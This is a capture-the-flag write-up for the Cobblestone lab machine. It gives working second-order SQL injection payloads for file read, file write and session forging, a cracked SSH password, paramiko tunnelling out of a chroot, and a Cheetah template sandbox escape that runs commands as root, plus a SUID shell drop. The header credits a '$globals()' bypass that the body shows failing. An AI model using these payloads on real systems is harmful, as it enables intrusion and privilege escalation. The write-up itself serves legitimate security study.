---
title: 'cobblestone — second-order SQLi → INTO OUTFILE session forge → SSH chroot escape via paramiko channels → Cobbler Cheetah SSTI to root'
description: 'HTB Insane Linux: stored URL re-injected into a second query without escaping for a 5-column UNION, MySQL LOAD_FILE for arbitrary file read, INTO OUTFILE to forge a PHP admin session, sha256 cracked for cobble SSH, paramiko direct-tcpip out of an rbash chroot to localhost cobblerd, $globals() bypass on the Cheetah template sandbox, generate_autoinstall renders as root'
pubDate: '2026-05-02'
category: 'writeups'
---

**HTB · Linux · Insane**

Cobblestone is a clean three-act chain on paper — **second-order SQL injection** on a voting site, **SSH into an `rbash` chroot** with a paramiko `direct-tcpip` channel that reaches localhost-only services, and **Cheetah SSTI in Cobbler's autoinstall renderer** for root. In practice the difficulty rating is earned at every act. The SQL injection is second-order through a stored field that gets re-concatenated into a *different* query, the rbash chroot has no shell binaries to break out with so you can't escape it conventionally at all, and the Cobbler 3.3.6 Cheetah sandbox blocks every published `#import`-flavored bypass — `$globals()` walks straight around it, but only after you've ruled out about a dozen other Cheetah primitives that also look like they should work.

Each phase has at least one moment where the obvious next move fails for a non-obvious reason and you have to find a different primitive in the same layer. That's the difference between Hard and Insane on this box.

## the targets

```text
target  : cobblestone.htb       10.129.232.170
hosts   : cobblestone.htb        — main app
          vote.cobblestone.htb   — secondary subdomain (the SQLi one)

attacker: 10.10.15.44
```

`vote.cobblestone.htb` is a small PHP voting site — register, log in, suggest URLs, view details on any suggestion, vote on them. The main `cobblestone.htb` is a static landing page. SSH on the main host. No other services reachable from the public IP — everything else is internal.

## phase 1 — second-order SQLi on vote.cobblestone.htb

The voting site has the usual flow: `register.php` → `login_verify.php` → `suggest.php` (POST a URL) → `details.php?id=N` (view a suggestion). I started with the unauthenticated surface and got blocked everywhere — the login is properly parameterized, no SQLi on `username`/`password`, no bypass via `OR 1=1`. Same for register. So I registered a real user and started hammering the *authenticated* endpoints.

`suggest.php` accepts a `url` POST parameter, returns a 302 to `/details.php?id=N` for a new row, where N is the suggestion id. The redirect tells me the row was created. Try the obvious injection on `url`:

```text
url = ' OR 1=1 -- -
→ 302 Location: /details.php?id=12
```

That's not an injection, the form just succeeded. The insert uses `mysqli_stmt::bind_param` (confirmed later via the source — but you can guess from the fact that *single quotes* in the URL value are visibly preserved through the round-trip when the suggestion renders). Direct first-order injection: nope.

`details.php?id=12` renders the suggestion in a Bootstrap card. The interesting part is what's *adjacent* to my submitted URL on that page — there's also an "Owner-ID" and a "Votes" count, which the page didn't read off the form. Those came from a follow-up query. So the rendering page is doing something like:

```php
$row = mysqli_query("SELECT * FROM votes WHERE id = $id");
$url = $row['url'];
// then a second query that uses $url as a string ...
$details = mysqli_query("SELECT * FROM votes WHERE url = '$url'");
```

That second query is the bug. The `$url` was *escape-clean* on insert (because `bind_param`), but on read it's pulled out as-is and concatenated into a new query without re-escaping. **Classic second-order SQLi** — the input is escaped going in, then trusted on the way out, because the developer who wrote `details.php` assumed everything coming out of the database had been sanitized at insert. It hadn't.

To trigger, I need a payload that *survives* the parameterized insert (so single quotes, etc., are stored literally) and then breaks out of the second query's string literal:

```text
url = x' UNION SELECT 1,2,3,4,5-- -
→ stored as the literal string  x' UNION SELECT 1,2,3,4,5-- -
→ on details.php render, the second query becomes:
   SELECT * FROM votes WHERE url = 'x' UNION SELECT 1,2,3,4,5-- -'
→ UNION fires
```

Confirm column count with the rendered card — five columns matches up with the rendered placeholders. The card layout maps the columns roughly as:

```text
col1 (id?)         → suggestion # in the header
col2 (user_id)     → "Owner-ID" line
col3 (approved?)   → not rendered visibly
col4 (url)         → suggestion title
col5 (votes)       → "Votes" line
```

So I have two reflected sinks (col2 and col4) for arbitrary scalar expressions. Build a tiny helper:

```python
def build_union(cols):
    """cols: 5-tuple mysql expressions. Returns url payload that breaks out of
    the string literal and injects UNION SELECT."""
    assert len(cols) == 5
    return "x' UNION SELECT " + ",".join(cols) + "-- -"
```

Wrap the whole register-login-suggest-render-extract loop in a Session-based exploit (`cobblestone_sqli.py`) with four modes: `query`, `file`, `write`, `login`.

### the things you can do once you have UNION on a sink

**`@@version`** — `mysql 8.0.x`. Modern enough that `secure_file_priv` could be set, but...

**`SELECT @@global.secure_file_priv`** comes back as the empty string. **`secure_file_priv=''` allows `LOAD_FILE` and `INTO OUTFILE` against any path the MySQL user can read/write.** Massive find — that's an arbitrary file read and write primitive immediately.

**`HEX(LOAD_FILE(UNHEX('<hex_path>')))`** to read files (hex-wrap the path so you don't have to deal with quote escaping inside the existing payload):

```python
def cmd_file(path):
    s = requests.Session(); register_and_login(s)
    hexpath = path.encode().hex()
    payload = build_union([
        "1337",
        f"HEX(LOAD_FILE(UNHEX('{hexpath}')))",
        "0",
        "0x78",          # 'x' as filler for col4 to keep the card visible
        "0"
    ])
    sid = submit_suggestion(s, payload)
    info = extract(view_details(s, sid))
    sys.stdout.buffer.write(bytes.fromhex(info['owner'].strip()))
```

```text
$ python cobblestone_sqli.py file /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
cobble:x:1000:1000:cobble,,,:/home/cobble:/bin/rbash
mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
tftp:x:104:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
john:x:1001:1001:,,,:/home/john:/bin/bash
```

Two real users: **cobble** (uid 1000, *rbash chroot*, our SSH target if I can crack a hash) and **john** (uid 1001, regular bash). `_laurel` shows there's audit logging configured — useful to know if I want to stay quiet later.

**Dump the schema** the same way:

```text
url = x' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables
        WHERE table_schema=database()-- -
→ users, votes, sessions

url = x' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns
        WHERE table_name='users'-- -
→ id, username, password, email, role
```

**Dump the users table.** Two real rows:

```text
url = x' UNION SELECT 1,concat(username,':',password),3,4,5 FROM users-- -
→ admin:f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1
→ cobble:20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d
```

64-char hex, no `$` prefix, no obvious salt. Looks like raw sha256.

### two paths from here, in parallel

**Path A — crack the hash and SSH as cobble.** sha256 with no salt is in hashcat mode `1400`. Both go into a file, point `rockyou.txt` at it:

```text
$ hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt --quiet
20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d:iluvdannymorethanyouknow
```

Cobble's hash cracks in ~12 seconds. Admin's doesn't crack in any of `rockyou`, `xato-net-10-million-passwords-1000000`, or a `rockyou + best64.rule` run. So the cobble SSH path is open; the admin web path needs a different approach.

**Path B — INTO OUTFILE to forge a PHP admin session.** `details.php` with `?id` doesn't render properly if the user isn't logged in, so the app uses PHP sessions. PHP's default session handler writes serialized session blobs to `/var/lib/php/sessions/sess_<sid>` (Debian default). The session file format is the trivial PHP serialize format:

```text
id|i:1;username|s:5:"admin";
```

If I can write that exact byte sequence to `/var/lib/php/sessions/sess_pwned`, then set my `PHPSESSID` cookie to `pwned`, the app will think I'm admin (id 1). With `secure_file_priv=''` and `INTO OUTFILE`, that's a one-shot:

```text
url = x' UNION SELECT UNHEX('<hex of session payload>'),2,3,4,5
        INTO OUTFILE '/var/lib/php/sessions/sess_pwned'-- -
```

The hex encoding of `id|i:1;username|s:5:"admin";` is `69647c693a313b757365726e616d657c733a353a2261646d696e223b`. After submitting and getting a 302 (which suggests the OUTFILE succeeded — INTO OUTFILE in MySQL inserts zero rows but doesn't error if the file write succeeds), set the cookie:

```text
$ curl -b 'PHPSESSID=pwned' http://vote.cobblestone.htb/admin.php
→ admin dashboard
```

That worked. The admin dashboard turns out to be relatively boring — you can approve/reject votes and a couple of things, but no obvious RCE primitive. Useful as confirmation the SQLi has full file-write reach (so I could `INTO OUTFILE` a webshell into `/var/www/html/`) but **not necessary** for the user/root path. Cobble's SSH is the more direct route. Path A wins.

I keep Path B documented because it shows the real reach of `secure_file_priv=''` — anyone with this SQLi can write arbitrary content anywhere the `mysql` user can write. On a less-locked-down instance this would be a webshell drop. Here, Apache's docroot is owned by `www-data` and not writable by `mysql`, so the OUTFILE→webshell pivot dies on permissions; only `/var/lib/php/sessions/` (and a few other places `mysql` can write) are reachable for the OUTFILE write.

## phase 2 — SSH cobble, find an rbash with no shell binaries

```text
$ ssh cobble@cobblestone.htb
cobble@cobblestone.htb's password: iluvdannymorethanyouknow

cobble@cobblestone:~$ ls /
bin  home  lib  lib64  usr

cobble@cobblestone:~$ ls /bin
bash  cat  echo  ls  pwd  rbash

cobble@cobblestone:~$ which cd
cobble@cobblestone:~$
cobble@cobblestone:~$ help | head -3
GNU bash, version 5.1.16(1)-release-(x86_64-pc-linux-gnu)
These shell commands are defined internally...
```

Restricted bash. The chroot is **tight** — five binaries total (`bash`, `cat`, `echo`, `ls`, `pwd`, `rbash`), no `cd`, no `/etc/passwd` (because we're inside the chroot), no `/proc` exposing host processes, no `vi`, no `awk`, no `find`, no `python`, no `perl`, no `nc`, no `wget`, no `curl`. Standard rbash escape attempts:

| attempt | result |
|---|---|
| `vi`, `nano`, `emacs`, `less`, `more`, `man` | binary not in chroot |
| `find / -exec /bin/bash {} \;` | `find` not in chroot |
| `awk 'BEGIN{system("/bin/bash")}'` | `awk` not in chroot |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | `python` not in chroot |
| `cd /tmp && ./binary` | `cd` is a builtin but disabled in `rbash` |
| `bash -c '...'` | `bash` IS in chroot, but `bash` looks at the same `PATH` and `cd` is still disabled, and there's nothing useful to execute |
| `ls -la /home/john` | `/home/john` doesn't exist *inside the chroot* |
| `cat /home/john/user.txt` | doesn't exist inside the chroot |

The user.txt presumably lives at `/home/john/user.txt` on the *real* filesystem, but inside the chroot I can't reach it. There's no kernel exploit on the host for the user (uid 1000) inside the chroot, and no SUID binary I can call.

The realization is that **I don't actually need a shell escape** to do useful work — I need to reach localhost-only services on the host. The SSH transport I'm already using has channel multiplexing for exactly this purpose. paramiko's `Transport.open_channel('direct-tcpip', remote, local)` opens a TCP connection from the *server* side to a (host, port) of my choice and proxies the bytes back to me. The chroot doesn't constrain channel requests — those happen in the SSH server (`sshd`) before the chroot is entered for shell execution.

So I do a port scan from my own machine *via the SSH connection* by trying `direct-tcpip` to common localhost ports:

```python
import paramiko, socket
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('10.129.232.170', username='cobble', password='iluvdannymorethanyouknow',
            allow_agent=False, look_for_keys=False)
t = ssh.get_transport()

for port in [80, 443, 631, 3000, 3306, 5000, 5601, 6379, 8000, 8080,
             8081, 8443, 9090, 9200, 11211, 25151, 27017]:
    try:
        ch = t.open_channel('direct-tcpip', ('127.0.0.1', port), ('127.0.0.1', 0))
        ch.close()
        print(f'[+] {port} open')
    except Exception as e:
        pass
```

```text
[+] 25151 open
```

**127.0.0.1:25151** — Cobbler's standard XML-RPC port. Not exposed externally; only reachable from inside the host or, via this trick, from inside an SSH channel.

## phase 3 — Cobbler XML-RPC over the SSH tunnel

`xmlrpc.client.ServerProxy` doesn't natively know how to dial through an SSH transport channel. The fix is to subclass `xmlrpc.client.Transport` and `http.client.HTTPConnection` so the underlying socket comes from `t.open_channel('direct-tcpip', ...)`:

```python
import paramiko, xmlrpc.client, http.client

SSH_HOST = '10.129.232.170'
SSH_USER = 'cobble'
SSH_PASS = 'iluvdannymorethanyouknow'
REMOTE   = ('127.0.0.1', 25151)

class ChanHTTPConn(http.client.HTTPConnection):
    def __init__(self, transport, remote, local=('127.0.0.1', 0)):
        self._transport = transport
        self._remote = remote
        self._local = local
        super().__init__(remote[0], remote[1], timeout=30)
    def connect(self):
        self.sock = self._transport.open_channel('direct-tcpip',
                                                 self._remote, self._local)
        self.sock.settimeout(30)

class SSHTransport(xmlrpc.client.Transport):
    def __init__(self, ssh_transport, remote):
        super().__init__()
        self._ssh_transport = ssh_transport
        self._remote = remote
    def make_connection(self, host):
        if self._connection and host == self._connection[0]:
            return self._connection[1]
        chost, _, _ = self.get_host_info(host)
        conn = ChanHTTPConn(self._ssh_transport, self._remote)
        self._connection = (host, conn)
        return conn

def connect():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(SSH_HOST, username=SSH_USER, password=SSH_PASS, timeout=15,
                allow_agent=False, look_for_keys=False)
    t = ssh.get_transport()
    proxy = xmlrpc.client.ServerProxy('http://127.0.0.1:25151',
        transport=SSHTransport(t, REMOTE), allow_none=True)
    return ssh, proxy

ssh, p = connect()
print('version:', p.extended_version()['version'])  # → 3.3.6
```

**Cobbler 3.3.6.** Default credentials `cobbler:cobbler` — try them:

```python
token = p.login('cobbler', 'cobbler')
print('templates:', p.get_autoinstall_templates(token))
print('snippets :', p.get_autoinstall_snippets(token))
```

Both work. I'm authenticated against cobblerd over the SSH `direct-tcpip` tunnel without ever escaping the chroot. Now find an injection point.

## phase 4 — the Cheetah sandbox, what blocks and what doesn't

Cobbler renders autoinstall (kickstart-style) templates with **Cheetah**, a Python templating engine. Cobbler 3.3.6 runs Cheetah with a sandbox that's supposed to block code execution. The standard internet-found bypass is `#import os` — try that first:

```text
template = "#import os\nOS=$os.uname()\n"
write_autoinstall_template('pwnz.ks', template, token)
generate_autoinstall('pwnprof')
→ HTTP 500: "Cheetah safe-mode forbids #import statements"
```

The Cobbler 3.x sandbox has been hardened against `#import`. Try the Cheetah `#from` directive:

```text
"#from os import popen\n$popen('id').read()\n"
→ HTTP 500: "Cheetah safe-mode forbids #from statements"
```

`#from` is also blocked. Try other Cheetah directives that might let me reach Python:

| attempt | result |
|---|---|
| `#import os` | blocked |
| `#from os import popen` | blocked |
| `#compiler-settings useStackFrames=True` | accepted but inert |
| `#raw / #end raw` | renders literally |
| `#set $g = globals()` | NameError: globals not defined |
| `V=$vars()` | NameError |
| `#set $c = getattr($re, 'sub')` | works — `$re` is the *re* module, exposed as a Cheetah builtin |
| `$re.__class__.__mro__[-1].__subclasses__()` | works — full subclass walk |
| `$re.__builtins__` | works — `__builtins__` is reachable through `$re` |
| `$re.__builtins__['__import__']('os')` | **works — bypasses the sandbox** |

So `#import` is blocked but **symbol lookup chains aren't filtered**. The sandbox blocks Cheetah *statements* (the `#`-prefixed directives that compile down to Python imports) but does not block *attribute access on already-exposed objects*. `$re` is exposed as a builtin (Cobbler uses it internally for templating). `$re.__builtins__` walks straight up to Python's builtins dict, and `__builtins__['__import__']('os')` is a regular Python call the sandbox has no hook for.

**Working SSTI payload:**

```text
#set $b = $re.__builtins__
#set $o = $b['__import__']('os')
#set $x = $o.popen('id 2>&1').read()
OUT_START
$x
OUT_END
```

The `OUT_START` / `OUT_END` markers are so I can grep the rendered output unambiguously, since Cobbler wraps the rendered template in some surrounding text I don't care about.

## phase 5 — get the template to render: distro + profile chain

Writing the template isn't enough — Cobbler only renders templates when bound to a *profile*, which is bound to a *distro*. `generate_autoinstall(profile)` is the method that walks the distro→profile→template chain and renders the template through Cheetah.

`new_distro` requires `kernel` and `initrd` paths, and Cobbler validates that the path exists on disk. My first attempt:

```text
new_distro → modify kernel='/vmlinuz' → save_distro
→ HTTP 500: "kernel not found: /vmlinuz"
```

Probe candidate paths from a list of likely kernel locations on a Debian host:

```python
candidates = [
    '/boot/vmlinuz', '/vmlinuz',
    '/var/lib/tftpboot/vmlinuz',
    '/var/lib/cobbler/loaders/vmlinuz',
    '/boot/vmlinuz-6.1.0-13-amd64',
    '/boot/vmlinuz-6.1.0-18-amd64',
    # ... a couple dozen more
]
for path in candidates:
    try:
        h = p.new_distro(token)
        p.modify_distro(h, 'name', 'probe_' + path.replace('/','_'), token)
        p.modify_distro(h, 'kernel', path, token)
        p.modify_distro(h, 'initrd', '/etc/hostname', token)
        p.modify_distro(h, 'breed', 'redhat', token)
        p.modify_distro(h, 'arch', 'x86_64', token)
        p.save_distro(h, token)
        print('[+] SUCCESS:', path)
        break
    except Exception as e:
        print('[-]', path, '->', str(e)[:80])
```

`/vmlinuz` works (it's the standard Debian symlink to the running kernel). `/etc/hostname` for the initrd is enough — Cobbler validates *existence* of the path, not that it's a valid initrd image. The actual boot would fail miserably, but **rendering the autoinstall template doesn't require a successful boot**. That's the key gap in Cobbler's validation.

Build the profile bound to that distro and my SSTI template:

```python
PROF, TPL = 'pwnprof', 'pwnz.ks'

# Distro
h = p.new_distro(token)
p.modify_distro(h, 'name',   'pwndist', token)
p.modify_distro(h, 'kernel', '/vmlinuz',     token)
p.modify_distro(h, 'initrd', '/etc/hostname', token)
p.modify_distro(h, 'breed',  'redhat', token)
p.modify_distro(h, 'arch',   'x86_64', token)
p.save_distro(h, token)

# Profile bound to distro + our template
h = p.new_profile(token)
p.modify_profile(h, 'name',        PROF,  token)
p.modify_profile(h, 'distro',      'pwndist', token)
p.modify_profile(h, 'autoinstall', TPL,   token)
p.save_profile(h, token)
```

Wrap the SSTI in a one-shot RCE function that takes a shell command, writes a fresh template, and renders:

```python
import re

def rce(p, token, shell_cmd):
    safe = shell_cmd.replace("\\", "\\\\").replace("'", "\\'")
    body = (
        "#set $b = $re.__builtins__\n"
        "#set $o = $b['__import__']('os')\n"
        "#set $x = $o.popen('" + safe + " 2>&1').read()\n"
        "OUT_START\n$x\nOUT_END\n"
    )
    p.write_autoinstall_template(TPL, body, token)
    rendered = p.generate_autoinstall(PROF)
    m = re.search(r"OUT_START\n([\s\S]*?)OUT_END", rendered)
    return m.group(1) if m else rendered[:2000]

print(rce(p, token, 'id; whoami; hostname'))
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
root
cobblestone
```

`cobblerd` runs as root by default. The Cheetah render happens inside `cobblerd`. The `$re.__builtins__['__import__']('os').popen(...)` call walks straight out of the sandbox and into a root subshell.

## phase 6 — collect the flags and clean up

Both flags from `cobblerd`'s root context:

```python
print(rce(p, token, 'cat /home/john/user.txt'))
print(rce(p, token, 'cat /root/root.txt'))
```

Cobble couldn't reach `/home/john/` from inside the rbash chroot. cobblerd, running as root and *not* chrooted, can.

For interactive work, drop a SUID copy of bash:

```python
rce(p, token, 'cp /usr/bin/bash /tmp/rootsh && chmod 4755 /tmp/rootsh')
```

Then `cobble@cobblestone:~$ /tmp/rootsh -p` from inside the rbash gives an effective uid 0 shell — except `cobble`'s rbash doesn't allow flag arguments, so the cleaner play is to just keep using `rce()` for any further root command and skip the SUID bash entirely.

Cleanup: `delete_profile`, `delete_distro`, `remove_autoinstall_template` so the next person looking at cobblerd doesn't see `pwnprof`/`pwndist`/`pwnz.ks` cluttering up the listing.

## what made this Insane

**Second-order SQLi looks like a dead end first.** The `suggest.php` insert is properly parameterized; everything you throw at it round-trips literally. People who stop there miss the bug entirely. The whole trick is realizing the *next* page (`details.php`) reads the stored value and concatenates it into a *different* query without re-escaping. It's a bug that lives in the gap between two functions; the dev who wrote `details.php` assumed everything coming out of the database had been sanitized at insert time. It hadn't. This is also why the SQL injection scanner you'd point at it returns clean — automated scanners almost never test second-order paths because they don't model "store this, then retrieve it from a different page."

**`secure_file_priv = ''` is rare in 2026 and hugely impactful.** Modern MySQL packages default to `secure_file_priv` set to `/var/lib/mysql-files/` or the equivalent, restricting `LOAD_FILE` and `INTO OUTFILE` to a single directory. The Cobblestone install has it explicitly cleared, which gives the SQLi an arbitrary file read primitive (used here for `/etc/passwd`, `/etc/mysql/my.cnf`, the source of `details.php` itself if you wanted to confirm the bug shape) and an arbitrary file write primitive within the directories `mysql` can write to. The PHP session forge is a clean demonstration of what that write reach lets you do without needing to find a webshell drop location.

**Rbash with no useful binaries forces a non-shell escape.** Six standard rbash bypasses fail because the binaries aren't in the chroot. Most boxes give you a `vi` or a `find` to escape with. Cobblestone gives you `bash`, `cat`, `echo`, `ls`, `pwd`, `rbash` — and that's it. The realization is that *I don't need a shell escape* — I need network reach, and the SSH transport already gives me arbitrary localhost connectivity through `direct-tcpip` channels. The chroot is enforced for shell-execution requests, not for channel requests. If you only think about chroot in terms of "what binaries are available," you miss the entire SSH-protocol-level layer that's still available to you.

**Cobbler 3.3.6 is patched against the *Python-import* SSTI bypass but not against attribute access.** Most Cobbler exploit writeups online lead with `#import os` which gets cleanly rejected by the Cheetah sandbox. `$re.__builtins__['__import__']('os')` is a *Python expression chain*, not a Cheetah statement, so the sandbox's import-statement filter doesn't see it. The sandbox lists "we block imports" — but they block import *statements*, not attribute lookups that happen to walk the same path. The lesson is: when a sandbox lists what it blocks, ask whether it blocks the *primitives* (here, "calling `__import__`") or the *syntactic forms* (here, `#import`). Almost always the answer is just the syntactic forms, and the primitives are reachable through normal attribute access.

**Cobbler validates distro paths exist but not that they boot.** I was nervous about `new_distro` requiring a real bootable kernel + initrd, but Cobbler's validation is path-existence, not file-format. `/vmlinuz` is a symlink Debian-y hosts ship by default, and `/etc/hostname` is a small text file. That gets you past the validation gate; the actual boot would fail miserably, but rendering the autoinstall template doesn't need a successful boot. This is the gap that makes the SSTI reachable at all — `generate_autoinstall(prof)` is just "render this template," not "actually serve this for an installer." The validation is checking the wrong invariant.

## TL;DR chain

```text
vote.cobblestone.htb
  ──► register + login (clean session for SQLi)
  ──► suggest.php properly parameterized — first-order injection fails
  ──► but details.php?id=N concatenates stored votes.url into a NEW query
  ──► 2nd-order SQLi: x' UNION SELECT 1,2,3,4,5-- -

  ──► @@global.secure_file_priv = ''  (file read + write enabled)
  ──► HEX(LOAD_FILE) → /etc/passwd → cobble (rbash) + john (bash) found
  ──► UNION SELECT username,password FROM users → admin + cobble sha256

  Path A:
    ──► hashcat -m 1400 + rockyou → cobble: iluvdannymorethanyouknow
  Path B (validated, unused):
    ──► INTO OUTFILE /var/lib/php/sessions/sess_pwned with admin session
    ──► PHPSESSID=pwned → admin web UI (no useful primitive there)

cobble@cobblestone (rbash chroot, ~5 binaries, no shell escape)
  ──► paramiko Transport.open_channel('direct-tcpip', ('127.0.0.1', PORT))
  ──► port-scan from my side via the SSH transport
  ──► 127.0.0.1:25151 = Cobbler 3.3.6 XML-RPC

  ──► default cobbler:cobbler creds work
  ──► #import os → blocked by Cheetah safe-mode
  ──► #from os → blocked
  ──► $re.__builtins__['__import__']('os').popen(cmd).read() → bypasses
  ──► new_distro kernel=/vmlinuz initrd=/etc/hostname (path-existence validation)
  ──► new_profile bound to distro + SSTI template
  ──► generate_autoinstall(profile) → Cheetah renders inside cobblerd
  ──► RCE as root (cobblerd runs as root)
  ──► cat /home/john/user.txt + cat /root/root.txt
```

The whole exploit fits in 80 lines of Python plus one paramiko channel hack. Cobbler is one of those services that is "secure enough" if you keep the admin credentials non-default and bind it to localhost only, but the moment one of those falls — both fell here — the SSTI gives root immediately because `cobblerd` runs as root by design. The defenses that actually matter are: parameterize *both* sides of the read/write split (first-order safety isn't enough), set `secure_file_priv` to a real directory (the empty string is the worst possible value), and run `cobblerd` under a dedicated unprivileged user with `CAP_NET_BIND_SERVICE` rather than as root.
